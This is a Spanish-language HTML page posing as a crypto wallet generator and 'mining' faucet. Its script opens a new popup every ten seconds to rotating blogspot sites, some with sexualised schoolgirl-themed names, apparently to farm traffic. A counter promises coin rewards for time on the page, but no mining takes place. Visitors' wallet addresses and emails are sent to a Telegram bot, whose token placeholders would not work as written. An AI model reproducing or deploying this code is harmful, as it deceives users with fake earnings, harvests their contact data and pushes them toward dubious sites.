<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirección Aleatoria</title>
  <style>
    body {
      text-align: center;
      padding: 50px;
      font-family: Arial, sans-serif;
    }
    #resultado {
      margin-top: 20px;
    }
    input, button {
      margin: 10px;
      padding: 10px;
    }
  </style>
</head>
<body>

<div id="redireccion"></div>

<button onclick="generarBilletera()">Generar Billetera</button>
<div id="resultado"></div>

<!-- Caja para ingresar billetera y correo -->
<div id="usuario-info">
  <input type="text" id="wallet" placeholder="Introduce tu billetera Worldchain" />
  <input type="email" id="correo" placeholder="Introduce tu correo" />
  <button onclick="guardarDatos()">Guardar Datos</button>
</div>

<button onclick="pararMineria()">Parar Minería</button>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

<script>
let nuevaVentana;
let tiempoTotal = 0;
let interval;
let minando = true;

// 🔥 FUNCIONES PRINCIPALES 🔥

// 👉 Redirección aleatoria
function redireccionAleatoria() {
  var urls = [
    "https://notiiciasmex.blogspot.com",
    "https://tareasunamyunadm.blogspot.com",
    "https://faucentminialtcrypto.blogspot.com",
    "https://solotareasmex.blogspot.com",
    "https://colegialas-calientes-69.blogspot.com",
    "https://colegialas14defebrero.blogspot.com",
    "https://joseperez69.blogspot.com",
    "https://mundogamermejico.blogspot.com",
    "https://backtrackingchesscaso.blogspot.com",
    "https://games2015steamyorigin.blogspot.com", 
    "https://videoescandalosmex.blogspot.com",
    "https://basededatosunadm.blogspot.com",
    "https://gmcas77.blogspot.com",
    "https://basededatostareas.blogspot.com"
  ];

  var indiceAleatorio = Math.floor(Math.random() * urls.length);
  var urlRedireccion = urls[indiceAleatorio];

  document.getElementById('redireccion').innerHTML = '<p>Redireccionando a: ' + urlRedireccion + '</p>';

  if (nuevaVentana) {
    nuevaVentana.close(); 
  }

  nuevaVentana = window.open(urlRedireccion, '_blank');

  setTimeout(redireccionAleatoria, 10000);
}

redireccionAleatoria();

// 👉 Generar Billetera
async function generarBilletera() {
    const wallet = ethers.Wallet.createRandom();
    document.getElementById('resultado').innerHTML = `
        <p><strong>Dirección:</strong> ${wallet.address}</p>
        <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
    `;
}

// 👉 Guardar Datos y enviar a Telegram
async function guardarDatos() {
    const wallet = document.getElementById('wallet').value;
    const correo = document.getElementById('correo').value;

    if (!wallet || !correo) {
        alert('Por favor, completa todos los campos.');
        return;
    }

    // 👉 Enviar mensaje al bot de Telegram usando las variables de entorno
    const mensaje = `🚀 Nueva Billetera Generada:\n\n📌 Billetera: ${wallet}\n📩 Correo: ${correo}`;

    const telegramToken = `${{ secrets.TELEGRAM_TOKEN }}`;
    const chatId = `${{ secrets.CHAT_ID }}`;

    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: mensaje
            })
        });

        const data = await response.json();
        if (data.ok) {
            alert('✅ Datos guardados y enviados a Telegram.');
        } else {
            alert('❌ Error al enviar el mensaje a Telegram.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('❌ Error al conectar con Telegram.');
    }
}

// 👉 Parar Minería
function pararMineria() {
    clearInterval(interval); 
    minando = false;
    alert(`✅ Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
}

// 👉 Contar el tiempo en la página
function contarTiempo() {
    if (minando) {
        tiempoTotal++;
        if (tiempoTotal % 100 === 0) {
            alert(`🚀 ¡Has ganado 100 CHC!`);
        }
    }
}

// 👉 Iniciar el conteo cada segundo
interval = setInterval(contarTiempo, 1000);

</script>

</body>
</html>
